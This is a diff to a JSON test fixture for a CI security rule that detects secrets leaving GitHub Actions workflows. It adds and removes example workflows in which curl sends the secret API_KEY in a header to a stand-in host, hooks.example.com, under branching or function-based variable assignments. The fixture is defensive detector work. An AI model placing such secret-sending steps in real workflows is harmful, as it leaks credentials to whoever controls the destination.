@@ -32412,6 +32412,11 @@
             },
             {
               "input_kind": "workflow",
+              "name": "untrusted-destination.several-values.yml",
+              "text": "# situation: on push, a step sets U to https://hooks.example.com when the\n#   ref is refs/heads/main and to https://api.github.com otherwise, and\n#   sends the secret API_KEY to \"$U/x\" with curl.\n# reason: on a push to main, U holds https://hooks.example.com when curl\n#   runs, so the request carries the secret to hooks.example.com; the rule\n#   judges the host of every assignment of U that reaches the request.\n# attack: the attacker takes over the server of hooks.example.com, by a\n#   breach of the vendor or by registering the domain when the domain\n#   lapses.\n# attack-run-behavior: on a push to main, curl sends the secret to\n#   hooks.example.com, whose server, now the attacker's, logs the secret.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          if [ \"$GITHUB_REF\" = refs/heads/main ]; then U=https://hooks.example.com; else U=https://api.github.com; fi\n          curl -fsS -H \"x-apikey: $API_KEY\" \"$U/x\"\n"
+            },
+            {
+              "input_kind": "workflow",
               "name": "untrusted-destination.shell-function.yml",
               "text": "# situation: on push, a step defines a function that sends its argument in a\n#   header to hooks.example.com, and calls the function with the secret\n#   API_KEY.\n# reason: the key goes to hooks.example.com through the argument of the\n#   function, and whoever holds that server receives the key.\n# attack: the attacker takes over the server of the destination, by a breach\n#   of the vendor or by registering the domain when the domain lapses.\n# attack-run-behavior: the workflow sends the request as it always does, and\n#   the server, now the attacker's, logs the value of API_KEY.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - shell: bash\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          send() { curl -fsS -H \"x-apikey: $1\" https://hooks.example.com/; }\n          send \"$API_KEY\"\n"
             },
@@ -32451,6 +32456,11 @@
               "input_kind": "workflow",
               "name": "untrusted-destination.service.yml",
               "text": "# situation: on push, a step sends the secret API_KEY with curl to the\n#   service search of the job.\n# reason: the job starts the container of the service for itself, so only\n#   the job's own container receives the key.\n# attack: the attacker takes over the server of the destination, by a breach\n#   of the vendor or by registering the domain when the domain lapses.\n# attack-run-behavior: the request goes to the container of the service,\n#   which the job started.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    services:\n      search:\n        image: elasticsearch:8.15.0\n    steps:\n      - shell: bash\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          curl -fsS -u \"elastic:$API_KEY\" http://search:9200/_cluster/health\n"
+            },
+            {
+              "input_kind": "workflow",
+              "name": "untrusted-destination.several-github-values.yml",
+              "text": "# situation: on push, a step sets U to https://api.github.com in both arms\n#   of an if, and sends the secret API_KEY to \"$U/x\" with curl.\n# reason: every assignment of U that reaches the request names GitHub's\n#   API, and GitHub decrypts the secrets to give them to the run, so the\n#   request gives GitHub nothing GitHub does not hold.\n# attack: the attacker takes over the server of the destination, by a breach\n#   of the vendor or by registering the domain when the domain lapses.\n# attack-run-behavior: the request goes to GitHub's API, which holds the\n#   secrets already.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          if [ \"$GITHUB_REF\" = refs/heads/main ]; then U=https://api.github.com; else U=https://api.github.com; fi\n          curl -fsS -H \"x-apikey: $API_KEY\" \"$U/x\"\n"
             },
             {
               "input_kind": "workflow",
@@ -32735,24 +32745,6 @@
               "input_kind": "workflow",
               "name": "unset-caller-local.yml",
               "text": "# situation: on push, a step sets s to x and defines reset, which unsets s;\n#   point makes s local with safe, calls reset, and sets s to the secret\n#   API_KEY. The step calls point and then sends $s in a header to\n#   hooks.example.com with curl.\n# reason: a todo (the same file): the unset in reset takes away the local that\n#   point made, so the assignment in point after reset sets the s of the step:\n#   the secret, which the request carries to the host.\n# cause: the rule keeps the local of point after the unset in reset, and gives\n#   s back x when point returns, so the rule does not read the value that\n#   point set after reset.\n# attack: the attacker takes over the server of the destination, by a breach\n#   of the vendor or by registering the domain when the domain lapses.\n# attack-run-behavior: curl sends the secret to hooks.example.com, whose\n#   server, now the attacker's, logs the secret.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          s=x\n          reset() { unset s; }\n          point() { local s=safe; reset; s=\"$API_KEY\"; }\n          point\n          curl -s -H \"x-apikey: $s\" https://hooks.example.com/x\n"
-            }
-          ]
-        },
-        {
-          "id": "several-destination-values",
-          "text": "a request whose host comes from a variable that more than one assignment of the script may set before the request (if c; then U=https://hooks.example.com; else U=https://api.github.com; fi; curl -H \"x-apikey: $KEY\" \"$U/x\"): the rule reads the host of the request from the assignment that comes last in the text of the script, and does not judge the hosts of the other assignments",
-          "finding_kinds": [
-            "secret-exfiltration.untrusted-destination"
-          ],
-          "disposition": "todo",
-          "needs": [
-            "same-file"
-          ],
-          "examples": [
-            {
-              "input_kind": "workflow",
-              "name": "several-destination-values.yml",
-              "text": "# situation: on push, a step sets U to https://hooks.example.com when the\n#   ref is refs/heads/main and to https://api.github.com otherwise, and\n#   sends the secret API_KEY to \"$U/x\" with curl.\n# reason: a todo (the same file): on a push to main, U holds\n#   https://hooks.example.com when curl runs, so the request carries the\n#   secret to hooks.example.com.\n# cause: the rule reads the host from the assignment that comes last in the\n#   script, U=https://api.github.com, a host of GitHub, and does not judge\n#   the host of the other assignment.\n# attack: the attacker takes over the server of hooks.example.com, by a\n#   breach of the vendor or by registering the domain when the domain\n#   lapses.\n# attack-run-behavior: on a push to main, curl sends the secret to\n#   hooks.example.com, whose server, now the attacker's, logs the secret.\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          if [ \"$GITHUB_REF\" = refs/heads/main ]; then U=https://hooks.example.com; else U=https://api.github.com; fi\n          curl -fsS -H \"x-apikey: $API_KEY\" \"$U/x\"\n"
             }
           ]
         },
